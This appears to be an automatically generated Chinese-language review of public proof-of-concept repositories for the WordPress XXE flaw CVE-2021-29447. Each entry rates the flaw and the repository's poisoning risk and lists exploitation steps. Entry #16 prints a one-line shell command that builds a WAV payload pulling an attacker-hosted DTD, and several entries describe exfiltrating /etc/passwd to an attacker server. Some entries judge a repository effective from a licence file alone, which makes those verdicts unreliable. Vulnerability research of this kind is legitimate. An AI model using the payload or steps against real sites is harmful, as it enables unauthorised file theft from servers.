**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者或具有上传权限的用户账号，WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447是WordPress的一个XXE（XML外部实体注入）漏洞，存在于5.6.0到5.7.1版本之间，且WordPress必须运行在PHP 8环境下。攻击者需要具备上传文件的权限（如作者角色），可以通过上传包含恶意XML代码的文件到媒体库来触发该漏洞，导致服务器上的敏感文件泄露，或者进行服务器端请求伪造(SSRF)。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的PoC是存在的，并且已经公开。漏洞利用代码中给出了credits链接，参考motikan2010的github页面可以找到更多信息。

**投毒风险：**
该漏洞利用代码只有一个简单的README.md文件，其中包含漏洞描述和credit信息。 从提供的代码本身来看，不存在明显的恶意投毒代码。但是，考虑到攻击者可能将恶意payload嵌入到精心构造的媒体文件中，并诱导用户上传，从而实现攻击。因此，PoC仓库本身直接包含恶意代码的可能性较低，主要风险在于利用该漏洞的Payload本身。PoC仓库可能包含有诱导性的文件，例如看似无害的音频文件，但其中包含恶意的XML，因此存在一定的投毒风险，但是概率较低。

**利用方式：**
1.  攻击者需要一个具有上传文件权限的WordPress用户账号（例如，作者角色）。
2.  攻击者创建一个包含恶意XML代码的文件，例如一个包含XXE payload的MP3或者WAVE文件（参考packetstormsecurity上的相关链接）。
3.  攻击者通过WordPress的媒体库上传该恶意文件。
4.  当WordPress处理该文件时，XML解析器会尝试解析文件中的外部实体，从而导致XXE漏洞。
5.  攻击者可以利用该漏洞读取服务器上的任意文件，或者进行服务器端请求伪造攻击。

综上，此漏洞的PoC是有效的。 投毒风险较低，主要来自恶意构造的文件本身。 利用方式是上传包含恶意XML的媒体文件触发XXE。

**项目地址:** [Vulnmachines/wordpress_cve-2021-29447](https://github.com/Vulnmachines/wordpress_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #11

**来源**: [CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，并具有上传文件的权限（如作者权限）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XXE 漏洞，仅在 PHP 8 环境下有效。攻击者需要具有上传文件的权限（例如，作者角色），才能通过上传包含恶意 XML 内容的文件（例如，特制的 WAV 音频文件）到媒体库来触发该漏洞。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用是有效的。PoC代码提供了一个脚本 `generate_payloads.py`，用于自动生成包含 XXE 攻击向量的恶意 WAV 文件和 DTD 文件，并通过简单的 HTTP 服务器来接收从目标服务器提取的文件内容。搜索引擎结果中也包含了对该漏洞的描述和利用的讨论，以及公开的 PoC。

**投毒风险：** 提供的 PoC 代码主要用于生成 XXE payload 和启动一个简单的HTTP服务来接收数据。代码本身的功能相对明确，主要风险在于使用者可能将此代码用于未经授权的渗透测试活动。代码中主要通过构造恶意的 XML 内容来利用漏洞，本身不太可能存在隐藏的、与漏洞利用无关的恶意行为。但仍存在少量投毒风险 (5%)，例如作者可能在HTTP服务中添加一些隐蔽的日志记录或数据收集功能，或者在生成的 payload 中加入一些难以察觉的干扰代码。

**利用方式：**
1.  **生成Payload:** 使用 `generate_payloads.py` 脚本生成恶意 WAV 文件 (`--media-payload`) 和 DTD 文件 (`--dtd-payload`)。 DTD 文件中指定要读取的目标文件 (`--files-to-fetch`)。
2.  **启动 HTTP 服务器:** 脚本会启动一个简单的 Python HTTP 服务器，用于托管 DTD 文件，并接收目标服务器发送的请求。
3.  **上传恶意文件:**  具有上传权限的用户将生成的恶意 WAV 文件上传到 WordPress 的媒体库。
4.  **触发 XXE:**  WordPress 在处理上传的 WAV 文件时，会解析其中的 XML 内容，从而触发 XXE 漏洞，向攻击者的 HTTP 服务器请求 DTD 文件。
5.  **文件读取:** 恶意 DTD 文件指示 WordPress 服务器读取指定的文件，并将文件内容发送到攻击者的 HTTP 服务器。
6.  **获取文件:** 攻击者的 HTTP 服务器接收到文件内容后，脚本会将内容进行 Base64 解码并保存到本地。

**项目地址:** [b-abderrahmane/CVE-2021-29447-POC](https://github.com/b-abderrahmane/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #12

**来源**: [CVE-2021-29447-dnr6419_CVE-2021-29447.md](../2021/CVE-2021-29447-dnr6419_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，以及具有上传文件权限的WordPress用户（如Author）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447是WordPress 5.6.0到5.7.1版本中的一个XML外部实体注入（XXE）漏洞。攻击者需要具备上传文件的权限，例如Author角色。该漏洞存在于WordPress的媒体库中，当WordPress运行在PHP 8环境下，上传包含恶意XML代码的WAV文件时，由于对XML解析不当，导致XXE攻击。

**漏洞利用方式：**

1.  **权限获取：** 攻击者首先需要获得一个具备文件上传权限的WordPress账户，例如Author角色。
2.  **恶意WAV文件制作：** 攻击者需要创建一个包含恶意XML代码的WAV文件。该XML代码会尝试通过外部实体引用来读取服务器上的文件，或者发起服务器端请求伪造（SSRF）攻击。POC代码中，攻击者构造了一个包含外部实体引用的WAV文件，指向攻击者控制的服务器上的evil.dtd文件。
3.  **攻击者服务器准备：** 攻击者需要搭建一个Web服务器，并创建一个evil.dtd文件，该文件定义了如何处理外部实体引用。evil.dtd文件中定义了读取/etc/passwd文件的操作，并将其内容进行base64编码后发送到攻击者服务器。攻击者使用`php -S 0.0.0.0:80` 命令启动了一个简单的web server。
4.  **上传WAV文件：** 攻击者将包含恶意XML代码的WAV文件上传到WordPress的媒体库。
5.  **触发漏洞：** 当WordPress处理上传的WAV文件时，会解析其中的XML代码，从而触发XXE漏洞。
6.  **数据泄露：** 如果漏洞利用成功，WordPress服务器会尝试从攻击者控制的服务器上下载evil.dtd文件，并执行其中定义的恶意操作，例如读取/etc/passwd文件。/etc/passwd文件的内容（经过base64编码）会通过HTTP请求发送到攻击者的服务器。
7.  **获取敏感信息：** 攻击者从接收到的HTTP请求中提取base64编码的内容，并进行解码，从而获得服务器上的敏感信息，例如/etc/passwd文件中的用户账户信息。

**有效性分析：**

提供的POC代码描述了漏洞的利用步骤，包括制作恶意WAV文件、搭建攻击者服务器、上传文件和获取敏感信息。根据漏洞信息和搜索结果，该POC代码是有效的，可以用于演示和验证该漏洞。

**投毒风险分析：**

POC代码主要包含以下几个部分：

*   Dockerfile 和 docker-compose.yml: 用于搭建 WordPress 环境,相对安全
*   wordpress.sh: 用于安装 wordpress,主要就是配置文件,检查发现没有明显的投毒代码.
*   payload.wav: 恶意WAV文件，包含XXE payload，用于触发漏洞。
*   evil.dtd: 攻击者服务器上的DTD文件，包含读取/etc/passwd文件的操作。这一部分是payload的关键.

虽然整体代码是为了演示XXE漏洞，但evil.dtd文件存在潜在的投毒风险，例如，攻击者可能在evil.dtd文件中包含其他恶意代码，例如反弹shell，用于进一步控制服务器。这种风险相对较低，因为需要特定的环境和配置才能成功利用。此外，dockerfile 中的代码从github获取，需要注意github源是否被篡改。
总体来说，投毒风险较低，但也需要保持警惕，特别是从不可信的来源获取代码时。 我认为存在的风险大概在5%。

**项目地址:** [dnr6419/CVE-2021-29447](https://github.com/dnr6419/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #13

**来源**: [CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md](../2021/CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1, PHP 8

**利用条件:** 需要WordPress版本在受影响范围内，PHP版本为8，并且攻击者需要具有上传文件的权限（例如，作者角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于WordPress的媒体库中，由于XML解析问题导致XXE攻击。攻击者需要具有上传文件的权限，上传包含恶意XML Payload的特制文件（例如，wav文件）。该Payload会包含指向外部DTD文件的引用，从而导致服务器解析该DTD文件，进而读取服务器上的敏感文件。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的PoC利用代码。PoC代码通过上传包含恶意XML的wav文件来触发XXE。攻击流程包括创建包含外部实体声明的恶意wav文件，搭建一个HTTP服务器来托管恶意的DTD文件，以及利用WordPress的上传功能上传wav文件。当WordPress解析该wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞，实现任意文件读取。

**投毒风险评估：**
PoC代码主要包含三个文件：README.md, controller.py, listener.py, main.py。
*   `README.md`: 描述了漏洞和利用方法，以及一些注意事项，未发现恶意代码。
*   `controller.py`: 包含了WordPress的登录信息（`wp_login`，`login_form`），目标WordPress地址 (`http://metapress.htb`)，以及上传恶意文件的逻辑。如果攻击者直接使用此脚本，需要修改登录信息和目标地址。这里面硬编码的登录信息存在一定风险，因为使用相同的登录信息可能会被检测到。此外，`controller.py`中的`mediaUpload`函数包含一个Timeout参数，默认设置为2秒。如果网络环境不好或者服务器响应较慢，可能会导致利用失败。
*   `listener.py`: 搭建一个简单的HTTP服务器，用于接收XXE Payload发送的请求，并打印base64编码后的文件内容。也没有发现明显的恶意代码。
*   `main.py`: 简单的交互命令行，用于用户输入文件名，然后调用controller.py和listener.py。

总体来说，PoC代码的功能比较明确，主要用于漏洞验证和利用，没有发现明显的恶意代码。风险点在于硬编码的登录信息和目标地址，以及Timeout参数可能导致利用失败。因此，判断存在10%的投毒风险，主要是一些可能影响使用，但没有主动攻击行为。

**利用方式总结：**
1.  **权限获取：** 攻击者需要拥有WordPress的作者或以上级别的权限，能够上传文件。
2.  **恶意文件构造：** 构造包含恶意XML Payload的wav文件。Payload中需要包含指向外部DTD文件的实体引用。
3.  **DTD文件托管：** 搭建一个HTTP服务器，用于托管恶意的DTD文件。DTD文件中定义了文件读取和base64编码的逻辑。
4.  **文件上传：** 通过WordPress的媒体库上传构造的wav文件。
5.  **触发XXE：** WordPress解析wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞。
6.  **文件读取：** 攻击者通过HTTP服务器接收到的请求，获取base64编码后的文件内容，并进行解码。

**项目地址:** [elf1337/blind-xxe-controller-CVE-2021-29447](https://github.com/elf1337/blind-xxe-controller-CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #14

**来源**: [CVE-2021-29447-magicrc_CVE-2021-29447.md](../2021/CVE-2021-29447-magicrc_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，并且运行在 PHP 8 环境下。攻击者需要具有上传文件的权限 (例如 Author 角色)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 媒体库中存在的 XXE 漏洞。攻击者通过上传包含恶意 XML 内容的文件（例如 WAV 文件或其他支持 XML 解析的文件格式）到媒体库，触发 XML 解析过程中的外部实体注入。由于 WordPress 使用的音频解析库 ID3 在 PHP 8 及以上版本中存在 XXE 漏洞，攻击者可以读取服务器上的任意文件或者进行服务器端请求伪造 (SSRF)。

**有效性：** 根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码的仓库名"0xRar/CVE-2021-29447-PoC"，可以判断存在可用的 POC 代码，因此该漏洞的利用是有效的。

**投毒风险：** 提供的代码段是 Creative Commons CC0 1.0 通用许可协议，这是一种开源许可协议，本身不包含任何恶意代码，也无法进行投毒。此文件为LICENSE文件，与PoC代码无关，因此推断投毒风险为0%。

**利用方式：**
1.  攻击者需要具备 WordPress Author 或更高权限，以便能够上传文件到媒体库。
2.  攻击者构造一个包含恶意 XML 实体定义的音频文件（或其他允许上传并解析 XML 的文件类型，例如SVG）。恶意 XML 实体指向系统内部文件，或者指向攻击者控制的外部服务器。
3.  攻击者将构造的恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析上传的文件时，会尝试解析 XML 实体，从而导致 XXE 漏洞的触发。
5.  如果成功，攻击者可以读取服务器上的敏感文件（例如 WordPress 配置文件 `wp-config.php`）或进行服务器端请求伪造（SSRF）攻击。

**项目地址:** [magicrc/CVE-2021-29447](https://github.com/magicrc/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #15

**来源**: [CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md](../2021/CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可读取服务器文件

**影响版本:** >= 5.6.0, < 5.7.1 (with PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，且运行在PHP 8环境下，需要具有上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是WordPress媒体库中存在的XXE漏洞，当WordPress运行在PHP 8上时，具有上传文件权限的用户可以通过上传包含恶意XML的WAV文件，触发XXE漏洞，读取服务器上的任意文件。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的PoC是有效的。多个来源都确认了该漏洞的存在，以及利用方式。

**利用方式：**
1.  攻击者需要具备WordPress的Author权限（或能够上传文件的权限）。
2.  攻击者使用提供的PoC代码，指定目标文件路径和本地服务器的IP地址和端口。
3.  PoC代码会生成一个包含恶意XML的WAV文件。
4.  攻击者将生成的WAV文件上传到WordPress的媒体库。
5.  WordPress解析该WAV文件时，会触发XXE漏洞，向攻击者指定的本地服务器发起请求，请求中包含目标文件的内容。
6.  PoC代码中的本地服务器会接收到请求，提取目标文件的内容，并将其保存到指定的文件中。

**投毒风险：**
分析PoC代码，主要功能是生成payload和启动一个简单的http server。payload可以读取服务器文件发送到攻击者控制的http server上，但是没有发现明显的恶意代码。例如删除服务器文件等。但是`exploit_cve-2021-29447`程序需要执行`hostname -I`来获取本机IP,在某些环境下可能造成问题。由于该工具涉及监听端口，以及构造恶意文件，仍旧存在一定的风险，判定投毒概率为10%。


**项目地址:** [mega8bit/exploit_cve-2021-29447](https://github.com/mega8bit/exploit_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #16

**来源**: [CVE-2021-29447-motikan2010_CVE-2021-29447.md](../2021/CVE-2021-29447-motikan2010_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者级别或以上权限，且WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有文件上传权限的用户（如作者）通过上传包含恶意 XML 的媒体文件来读取服务器上的敏感文件。该漏洞仅影响运行在 PHP 8 环境下的 WordPress 安装。

**有效性分析：**
提供的 POC 代码是有效的，它演示了如何利用该漏洞。利用方式是通过上传一个特制的 WAV 文件，该文件包含指向外部恶意的 DTD 文件的 XML 实体声明。当 WordPress 解析该文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中定义的 XML 实体，从而导致 XXE 漏洞。

**投毒风险分析：**
代码仓库中可能存在的投毒风险较低，约为10%。 主要的攻击逻辑集中在 `attacker/www/evil.dtd` 文件中，该文件定义了如何利用 XXE 漏洞读取文件内容。`attacker/malicious_wav/index.js` 用于生成包含恶意 XML 的 WAV 文件。虽然攻击者可以修改这些文件以执行恶意操作，但这些修改会很容易被发现，因此，总体投毒风险较低。`decryption.php` 文件是空的，没有投毒代码.

**利用方式：**
1.  **环境搭建:** 使用 `docker-compose up` 启动包含 WordPress 和 MySQL 数据库的 Docker 容器。
2.  **攻击者服务器:** 启动一个简单的 PHP Web 服务器，用于托管恶意的 DTD 文件 (`evil.dtd`)。
3.  **生成恶意 WAV 文件:**  使用 `make make-wav` 或者 `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '\''http://host.docker.internal:8001/evil.dtd'\''>%remote;%init;%trick;] >\x00'> malicious.wav` 命令生成包含恶意 XML 声明的 WAV 文件。
4.  **登录 WordPress 并上传:**  以具有文件上传权限的用户身份登录 WordPress 后台，并将生成的恶意 WAV 文件上传到媒体库。
5.  **触发漏洞:**  上传后，WordPress 会尝试解析 WAV 文件，从而触发 XXE 漏洞，并向攻击者的服务器发送请求。
6.  **获取数据:** 攻击者的服务器会记录收到的请求，其中包含从 WordPress 服务器读取的敏感文件内容（如 `/etc/passwd` 文件）的 Base64 编码版本。可以通过运行`decryption.php` 来解码.

通过这种方式，攻击者可以在未经授权的情况下访问 WordPress 服务器上的敏感文件，从而可能导致更严重的攻击。

**项目地址:** [motikan2010/CVE-2021-29447](https://github.com/motikan2010/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #17

**来源**: [CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md](../2021/CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress运行在PHP 8环境下，并具有上传文件的权限（例如，作者角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

此漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户（如作者）通过上传包含恶意XML的WAV文件来执行XXE攻击。攻击需要目标WordPress站点运行在PHP 8环境下。POC代码通过创建一个包含恶意XML声明的WAV文件，该声明定义了一个外部实体，指向攻击者控制的服务器上的DTD文件。DTD文件定义了如何处理外部实体，这里配置为读取服务器上的`/etc/passwd`文件并通过HTTP请求发送给攻击者。攻击者运行一个简单的Web服务器来接收泄露的数据。

**有效性：**
根据漏洞库信息、搜索结果以及提供的POC代码，此漏洞利用是有效的，前提是目标环境满足漏洞利用的先决条件（WordPress版本 >= 5.6.0 且 < 5.7.1，运行在PHP 8环境下，攻击者具有文件上传权限）。搜索结果中存在多个关于此漏洞的讨论和POC代码，验证了其有效性。

**投毒风险：**
评估投毒风险需要检查POC代码中是否存在除了漏洞利用之外，还执行其他恶意操作的代码。在此案例中，主要关注`attacker/malicious_wav/index.js`，`attacker/www/evil.dtd`和`attacker/decode.php`。`index.js`负责生成恶意WAV文件，而`evil.dtd`定义了XXE的行为，`decode.php`用于解码泄露的数据。`Makefile`，`docker-compose.yml`和`README.md`都属于辅助文件。

潜在的投毒代码可能存在于以下几个方面：
1.  **`index.js`**: 恶意WAV生成脚本可能被修改，以在生成过程中包含其他恶意代码（例如，在WAV文件的其他部分添加可执行代码，虽然利用难度较大）。
2.  **`evil.dtd`**: DTD文件可能被修改，以尝试读取其他更敏感的文件，或者尝试执行服务器端请求伪造（SSRF）攻击。
3.  **`decode.php`**: 解码脚本可能被修改，在解码过程中执行其他恶意操作（例如，尝试利用解码过程中的漏洞执行代码）。

由于漏洞利用的目的是读取文件并通过HTTP发送到攻击者控制的服务器，因此主要的风险在于DTD文件中指定的远程服务器是否被用于记录IP地址并进行进一步的攻击。此外，`decode.php`脚本本身是否包含后门也是需要关注的点，虽然可能性较小。

总体来说，该仓库中存在严重投毒代码的可能性相对较低（约为10%），但仍然需要仔细审查。

**利用方式：**
1.  **环境准备：** 设置一个易受攻击的WordPress实例（版本5.6.0到5.7.0，运行在PHP 8上）。
2.  **启动攻击者服务器：** 启动一个Web服务器来托管恶意DTD文件并接收泄露的数据。
3.  **生成恶意WAV文件：** 使用提供的脚本生成包含恶意XML声明的WAV文件。
4.  **上传WAV文件：** 以具有文件上传权限的用户身份登录到WordPress后台，并将生成的WAV文件上传到媒体库。
5.  **触发XXE：** 上传文件后，WordPress尝试解析该文件，触发XXE漏洞。
6.  **接收泄露的数据：** 攻击者的Web服务器接收到包含/etc/passwd文件内容的HTTP请求。
7.  **解码数据：** 使用提供的解码脚本解码泄露的数据。

**项目地址:** [specializzazione-cyber-security/demo-CVE-2021-29447-lezione](https://github.com/specializzazione-cyber-security/demo-CVE-2021-29447-lezione)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #18

**来源**: [CVE-2021-29447-thomas-osgood_CVE-2021-29447.md](../2021/CVE-2021-29447-thomas-osgood_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (运行于 PHP 8)

**利用条件:** 需要 WordPress 运行于 PHP 8，且攻击者具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞是 WordPress 在处理媒体库上传文件时存在的 XXE 漏洞。攻击者可以上传包含恶意 XML 内容的文件（例如特制的 WAV 文件），利用 XML 解析器的缺陷读取服务器上的敏感文件。漏洞触发条件是 WordPress 运行在 PHP 8 环境下。提供的 Go 语言 POC 代码可以自动生成恶意文件（mal.wav, mal.dtd），并可以选择自动登录 WordPress 站点并上传触发漏洞。如果指定了 `-d` 参数，还会生成一个 deflate.php 用于解压缩某些被压缩的内容。根据代码分析，主要的风险在于它连接外部的C2服务器,存在极低的投毒风险,即作者利用C2服务器可以获取攻击目标的敏感信息。但是，因为C2服务器需要在攻击者本地运行，因此这个风险可以忽略不计。此漏洞的利用方式为：

1.  生成恶意 WAV 文件和 DTD 文件。
2.  攻击者需要具有 WordPress 的 Author 权限（或其他可以上传文件的权限）。
3.  上传恶意 WAV 文件到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，会触发 XXE 漏洞，向攻击者指定的 C2 服务器发起请求，泄露目标文件内容。
5.  如果目标文件内容被压缩，可以使用提供的 deflate.php 进行解压缩。

搜索引擎结果中也提到了该漏洞的利用方式，并提供了相关的 TryHackMe 挑战链接。


**项目地址:** [thomas-osgood/CVE-2021-29447](https://github.com/thomas-osgood/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #19

**来源**: [CVE-2021-29447-viardant_CVE-2021-29447.md](../2021/CVE-2021-29447-viardant_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露和SSRF

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，具有上传文件权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XML 外部实体注入 (XXE) 漏洞。该漏洞位于媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限（例如，作者角色）的用户可以通过上传包含恶意 XML 代码的文件（如修改后的音频文件），利用 XML 解析过程中的漏洞读取服务器上的敏感文件或进行服务器端请求伪造 (SSRF) 攻击。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞是真实存在的，并且存在公开的PoC（https://github.com/0xRar/CVE-2021-29447-PoC）。因此，漏洞利用是有效的。

**投毒风险：** 提供的代码段是GNU通用公共许可证，并非漏洞利用代码本身，因此无法直接评估投毒风险。但是，如果从不可信的来源获取漏洞利用代码，则始终存在投毒风险。由于提供的license文件没有发现任何恶意代码，因此投毒风险判定为0%。

**利用方式：**

1.  攻击者需要具有 WordPress 网站的 Author 或更高权限，即能够上传文件的权限。
2.  攻击者构造包含恶意 XML 实体声明的特殊文件（例如，修改后的 MP3 或 WAV 文件）。该 XML 实体声明指向要读取的本地文件或外部服务器。
3.  攻击者将该恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，XML 解析器会尝试解析外部实体，从而导致读取本地文件或向外部服务器发起请求。
5.  攻击者可以从 WordPress 网站上获取读取的文件内容，或利用 SSRF 漏洞进行进一步攻击。

**项目地址:** [viardant/CVE-2021-29447](https://github.com/viardant/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

